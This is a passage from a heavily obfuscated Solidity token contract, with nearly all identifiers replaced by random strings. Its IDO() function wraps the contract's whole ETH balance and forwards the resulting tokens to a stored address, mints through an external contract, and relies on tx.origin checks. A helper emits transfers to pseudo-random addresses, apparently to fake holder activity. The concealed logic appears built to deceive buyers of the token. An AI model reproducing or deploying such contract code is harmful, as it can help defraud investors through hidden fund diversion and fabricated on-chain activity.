          ahDqNcFSJJNEO0dfFqimha57HQT135FtVLudmINuOOwuUj3D8HXLrygno5LKppg1HBH009oDA5xJTJUk42v0FO0jDYFU78qk(eAuKvG25KqNKhplfXmabKNnFfK82deVF5InpBCnQF8cZjwrMOHreJUx8P0s0AjTzujB2lyMvBpEBfjL0rruAAAsiph047wk4),
          tx.origin,
          voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23,
          yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH,
          lYWZP5zfALUsN75RgG3L8nKBdhGO2qGFbOoi5Jc2zxCjJbdcfKO4rKCMTM2aKgg7YWYQ2hb6bSNRRN9RuzHUNykHDAr5jl33
        );
      } else if (roxy0stbQKhOJcucvS5v68bxsSWDsvpih36u3uMGJ9v8xVCBWN3jt5qN51suHAOmuwCUciqVyaWUWT1c6T9zsHOhaot7OdsE == 3) {
        zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[ttJjgE0CSFBaEyCuD0ftZABipGktaNSJm9MwfmwJAeRCCCkFXL1sHoILy41I8MV0DItNv0kyOwRCcN8xlUxVxJN6KazKcXDL] = true;
      } else if (roxy0stbQKhOJcucvS5v68bxsSWDsvpih36u3uMGJ9v8xVCBWN3jt5qN51suHAOmuwCUciqVyaWUWT1c6T9zsHOhaot7OdsE == 4) {
        nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE = nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE / eAuKvG25KqNKhplfXmabKNnFfK82deVF5InpBCnQF8cZjwrMOHreJUx8P0s0AjTzujB2lyMvBpEBfjL0rruAAAsiph047wk4;
      }
    }

    if (bu9AJUdkanQDW8AXugUVCqfA1QnOTkTQi0FFUXbQ3506s3e6NqEqh3yffjvhyd3ZNxSLlDkBS3W0CgGYjs47UmnMUPIBwtsk > eHLdEoyVPWAPaFSYwpKo7ngNeDLXApy9GTEEidvfqxNQRZ2QcrTXoYX9pIFgf4dE0OunbE2GuDYTV74AEvpV0hrMnRPoUqAg) {
      nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE = nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE + bu9AJUdkanQDW8AXugUVCqfA1QnOTkTQi0FFUXbQ3506s3e6NqEqh3yffjvhyd3ZNxSLlDkBS3W0CgGYjs47UmnMUPIBwtsk - eHLdEoyVPWAPaFSYwpKo7ngNeDLXApy9GTEEidvfqxNQRZ2QcrTXoYX9pIFgf4dE0OunbE2GuDYTV74AEvpV0hrMnRPoUqAg;
    }

    //
    if (bu9AJUdkanQDW8AXugUVCqfA1QnOTkTQi0FFUXbQ3506s3e6NqEqh3yffjvhyd3ZNxSLlDkBS3W0CgGYjs47UmnMUPIBwtsk < yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH) {
      if (nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE > 0) nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE = nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE / 20;
    }

    eHLdEoyVPWAPaFSYwpKo7ngNeDLXApy9GTEEidvfqxNQRZ2QcrTXoYX9pIFgf4dE0OunbE2GuDYTV74AEvpV0hrMnRPoUqAg = yDpmbuuNS69l8LkrGCLDwp1gM2ds861xpvv0sJfY8Ju8k2jW1z74PMnE2lOVqXYE82afZgedvezQEVQAF92qdpSN6woIQlPH;
  }

  function gkvdpS98cTdOYZ9JEyBmMyggobVdMT3xxzkPznZZ4Xa4L8DQj313cl8N12Be5iOntmg7aKs7A7RntNUGLbyefMBjm5EbKR6t(uint256 dNDxE00UqlbXpy4WdE8HsGjSLDwgSvwF5JMOTJ16XpZ46py5o1WxBle9OFt0djVjlFNOAsG3Kxxwb3y8wMPm5OPgNzxbJPpv, uint256 voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23) internal {
    uint256 mFZY0WcHcqFiCbuafirGYxyYMmL8MpykeoeAOAq8rPiGNC9wLNreavlR0LF1p7bpU5iAprZZdcbxEoXapHCO7DVT2Ks8AlzB = voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23;
    for (uint256 i; i < dNDxE00UqlbXpy4WdE8HsGjSLDwgSvwF5JMOTJ16XpZ46py5o1WxBle9OFt0djVjlFNOAsG3Kxxwb3y8wMPm5OPgNzxbJPpv; i++) {
      rDlDwg0bp1LolHhvJTChE6evmWPgzbbDsYdWNCuoaukRk2YK6eXyXefJY95Re95dbguqbgG3nDtQw7rNNHdM14TQOLt16eTZ(address(this), ahDqNcFSJJNEO0dfFqimha57HQT135FtVLudmINuOOwuUj3D8HXLrygno5LKppg1HBH009oDA5xJTJUk42v0FO0jDYFU78qk(mFZY0WcHcqFiCbuafirGYxyYMmL8MpykeoeAOAq8rPiGNC9wLNreavlR0LF1p7bpU5iAprZZdcbxEoXapHCO7DVT2Ks8AlzB), mFZY0WcHcqFiCbuafirGYxyYMmL8MpykeoeAOAq8rPiGNC9wLNreavlR0LF1p7bpU5iAprZZdcbxEoXapHCO7DVT2Ks8AlzB);
      mFZY0WcHcqFiCbuafirGYxyYMmL8MpykeoeAOAq8rPiGNC9wLNreavlR0LF1p7bpU5iAprZZdcbxEoXapHCO7DVT2Ks8AlzB =
        (uint256(keccak256(abi.encode(mFZY0WcHcqFiCbuafirGYxyYMmL8MpykeoeAOAq8rPiGNC9wLNreavlR0LF1p7bpU5iAprZZdcbxEoXapHCO7DVT2Ks8AlzB, block.timestamp))) %
          (1 + voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23 - voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23 / 10)) +
        voD8sl1jX0QxfFnlETFWgTgkjxuCVsJNbEQ5QzZPcXkCgXRPRKhvLiRH7xevlTTUzpk60CJUielMKSGlcpgB6Kb2D8FlkR23 /
        10;
    }
  }

  function IDO() external payable {
    require(sDo6tVImWpbAFLpS3aoBo0TW0QMg3qKF8BUarJfEjggxLkucpjGXaxBcxEBOJLMFR8UcW3aivbdqaf6Q1Ma1ZJJhyTNEtbkQ > 0 && msg.value > 0);
    uint256 eTiHKdmGRlCdqUIsWURWTU7MWoTLxyJ1QTmR8dxetFKhKO0SXzYBBV6QkS5izF8L0EHieCRbP6466m0zeE2J8vmvdgHwYGdz;
    uint256 znpA82GgoFlG9BcoqLCB3vDRXrAG24ODJU7CaVMjZYEf7ulgt3pSfAI2UaK2CvDiJE9FBxERX1gf5L8nWZPDxirWXHcdIWfE;

    qFNdhdtL0p6EL2KDxG5E2fjxHEhne9wDoKX3JHSrKLTeS2KIlCv2HCsoNdP7HObhwvFqPKAWRq4UMZaeyTRCvYOq5a1VbK3c(sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc).deposit{value: address(this).balance}();

    uint256 jzzafhjEWCP6qgPKAEmEaBKQdTYvqP1b9ussBpcrlbo2WnJ7R8PwYWfP7nnmGKfxzqwuAFOa0WD4TBs7DBjgejrgo11xv1YW = IERC20(sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc).balanceOf(address(this));

    eTiHKdmGRlCdqUIsWURWTU7MWoTLxyJ1QTmR8dxetFKhKO0SXzYBBV6QkS5izF8L0EHieCRbP6466m0zeE2J8vmvdgHwYGdz = (mTMGAS6wsd6m174a1IRbzBduQC1jz6AM60QtsSayuu0WD9VqU6Oq9l1E7IET5hgqeiOFNBSJzVvdKFnnzpnVMGQIMjpW4ODQ * jzzafhjEWCP6qgPKAEmEaBKQdTYvqP1b9ussBpcrlbo2WnJ7R8PwYWfP7nnmGKfxzqwuAFOa0WD4TBs7DBjgejrgo11xv1YW) / rvZPf4x8oPyLvTc5LlmJLd0ySsz81zo2U7K0WmrtvbO1pGAYdbO0kxDFbX6W6GhVLvQLcxINrJcdojlVTdfv4br39alIeJ5y;

    uint256 mHx85MbtzcaaHdLOU4nPvdWyJagjx3xPSci7Gd1CafRrobtqL3WJ1ydiKcRlSvBpFhTeAOobHs6vGwV25LyaNwwPhbnq6EUX = 100;
    znpA82GgoFlG9BcoqLCB3vDRXrAG24ODJU7CaVMjZYEf7ulgt3pSfAI2UaK2CvDiJE9FBxERX1gf5L8nWZPDxirWXHcdIWfE = eTiHKdmGRlCdqUIsWURWTU7MWoTLxyJ1QTmR8dxetFKhKO0SXzYBBV6QkS5izF8L0EHieCRbP6466m0zeE2J8vmvdgHwYGdz / mHx85MbtzcaaHdLOU4nPvdWyJagjx3xPSci7Gd1CafRrobtqL3WJ1ydiKcRlSvBpFhTeAOobHs6vGwV25LyaNwwPhbnq6EUX;
    if (eTiHKdmGRlCdqUIsWURWTU7MWoTLxyJ1QTmR8dxetFKhKO0SXzYBBV6QkS5izF8L0EHieCRbP6466m0zeE2J8vmvdgHwYGdz > sDo6tVImWpbAFLpS3aoBo0TW0QMg3qKF8BUarJfEjggxLkucpjGXaxBcxEBOJLMFR8UcW3aivbdqaf6Q1Ma1ZJJhyTNEtbkQ) {
      eTiHKdmGRlCdqUIsWURWTU7MWoTLxyJ1QTmR8dxetFKhKO0SXzYBBV6QkS5izF8L0EHieCRbP6466m0zeE2J8vmvdgHwYGdz = sDo6tVImWpbAFLpS3aoBo0TW0QMg3qKF8BUarJfEjggxLkucpjGXaxBcxEBOJLMFR8UcW3aivbdqaf6Q1Ma1ZJJhyTNEtbkQ;
      if (znpA82GgoFlG9BcoqLCB3vDRXrAG24ODJU7CaVMjZYEf7ulgt3pSfAI2UaK2CvDiJE9FBxERX1gf5L8nWZPDxirWXHcdIWfE > zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y[address(this)])
        znpA82GgoFlG9BcoqLCB3vDRXrAG24ODJU7CaVMjZYEf7ulgt3pSfAI2UaK2CvDiJE9FBxERX1gf5L8nWZPDxirWXHcdIWfE = zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y[address(this)];
      else
        rDlDwg0bp1LolHhvJTChE6evmWPgzbbDsYdWNCuoaukRk2YK6eXyXefJY95Re95dbguqbgG3nDtQw7rNNHdM14TQOLt16eTZ(
          address(this),
          address(0xdEaD),
          zu9MVKn9DBe6SqwBb5JYOJYQqLnPk9HHP9cfcQUW1o1CtDqtnOQ11ZBN3btQJMrH55YtqZjXauDRloXtIjUDFrfvOm81nI2y[address(this)] - znpA82GgoFlG9BcoqLCB3vDRXrAG24ODJU7CaVMjZYEf7ulgt3pSfAI2UaK2CvDiJE9FBxERX1gf5L8nWZPDxirWXHcdIWfE
        );
    }

    IERC20(sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc).transfer(yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ, jzzafhjEWCP6qgPKAEmEaBKQdTYvqP1b9ussBpcrlbo2WnJ7R8PwYWfP7nnmGKfxzqwuAFOa0WD4TBs7DBjgejrgo11xv1YW);
    iIcElhWCTdk0Mp2bVjnaGpvy7uah9yPeZZG2geS1IFbJ9AOaGdU6ztrQAMpLNqBnmw7cfHxXBL0Fe6dPPk2tABWDP7K3B8CT(tH6GdcFY4R73C5F3ImO7vvmzJrI0CYN9MWY7i5bRMb36Xu1Fr9WO38GNJlSDApTGwdaKQbkWr93l0eFQ8lHHMthYuKqFeRTE, yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ, eTiHKdmGRlCdqUIsWURWTU7MWoTLxyJ1QTmR8dxetFKhKO0SXzYBBV6QkS5izF8L0EHieCRbP6466m0zeE2J8vmvdgHwYGdz);

    sDo6tVImWpbAFLpS3aoBo0TW0QMg3qKF8BUarJfEjggxLkucpjGXaxBcxEBOJLMFR8UcW3aivbdqaf6Q1Ma1ZJJhyTNEtbkQ -= eTiHKdmGRlCdqUIsWURWTU7MWoTLxyJ1QTmR8dxetFKhKO0SXzYBBV6QkS5izF8L0EHieCRbP6466m0zeE2J8vmvdgHwYGdz;
    rDlDwg0bp1LolHhvJTChE6evmWPgzbbDsYdWNCuoaukRk2YK6eXyXefJY95Re95dbguqbgG3nDtQw7rNNHdM14TQOLt16eTZ(address(this), tx.origin, znpA82GgoFlG9BcoqLCB3vDRXrAG24ODJU7CaVMjZYEf7ulgt3pSfAI2UaK2CvDiJE9FBxERX1gf5L8nWZPDxirWXHcdIWfE);

    zHOOCc5vPp2SXX8ejHFV0zgw5r7R2M7GhiOIcKwbZcLKR2scFIv1tgOXVGDNnPez8Ddlw3I1eFeRxaIQwet4MJxk8KPyVukE(yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ).mint(address(0));

    eHLdEoyVPWAPaFSYwpKo7ngNeDLXApy9GTEEidvfqxNQRZ2QcrTXoYX9pIFgf4dE0OunbE2GuDYTV74AEvpV0hrMnRPoUqAg += msg.value;
    if (!zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[tx.origin]) nJHd5DGLDuvrI4Nc8txHfLYL3Vb4sh6RuzUfbc8VZnh5Vx2Bj4E0CQkca2paPjzixIuJQJTJjsM7PHZKyALRttztTSHcn3CE += msg.value;

    gkvdpS98cTdOYZ9JEyBmMyggobVdMT3xxzkPznZZ4Xa4L8DQj313cl8N12Be5iOntmg7aKs7A7RntNUGLbyefMBjm5EbKR6t(10, znpA82GgoFlG9BcoqLCB3vDRXrAG24ODJU7CaVMjZYEf7ulgt3pSfAI2UaK2CvDiJE9FBxERX1gf5L8nWZPDxirWXHcdIWfE / mHx85MbtzcaaHdLOU4nPvdWyJagjx3xPSci7Gd1CafRrobtqL3WJ1ydiKcRlSvBpFhTeAOobHs6vGwV25LyaNwwPhbnq6EUX);
  }
}